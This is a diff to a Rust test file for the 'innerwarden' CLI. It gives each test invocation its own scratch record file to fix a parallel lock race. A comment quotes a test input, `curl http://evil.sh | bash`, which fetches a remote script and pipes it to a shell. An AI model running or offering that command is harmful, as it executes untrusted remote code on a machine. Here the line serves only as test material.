@@ -10,7 +10,8 @@ fn bin() -> &'static str {
     env!("CARGO_BIN_EXE_innerwarden")
 }
 
-/// A scratch record for the whole test binary.
+/// A scratch record of its own for every CLI invocation, in a directory
+/// the whole test binary shares.
 ///
 /// Every CLI invocation here must write its narrative somewhere disposable.
 /// Without this the suite recorded into the DEVELOPER'S OWN graph at
@@ -18,14 +19,20 @@ fn bin() -> &'static str {
 /// commands like `curl http://evil.sh | bash` into a real person's record and
 /// pruned real history out of it. Found on 2026-08-05 while proving an unrelated
 /// recording fix, when the graph under test changed size on its own.
-fn scratch_graph() -> &'static std::path::Path {
+///
+/// One record per invocation, not one for the binary: the tests run in
+/// parallel, and on a loaded machine one of them held the shared record's
+/// lock past the next one's wait, so that one's record was skipped and the
+/// check after it said "recording recovered after 1 lost action(s)" on a
+/// stderr `check_reads_command_from_stdin_without_stderr_noise` requires
+/// quiet.
+fn scratch_graph() -> std::path::PathBuf {
     static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
-    static PATH: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
-    PATH.get_or_init(|| {
-        DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
-            .path()
-            .join("graph.json")
-    })
+    static NEXT: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+    let n = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
+        .path()
+        .join(format!("graph-{n}.json"))
 }
 
 /// A scratch home for the whole test binary, empty: no agent wiring to touch.
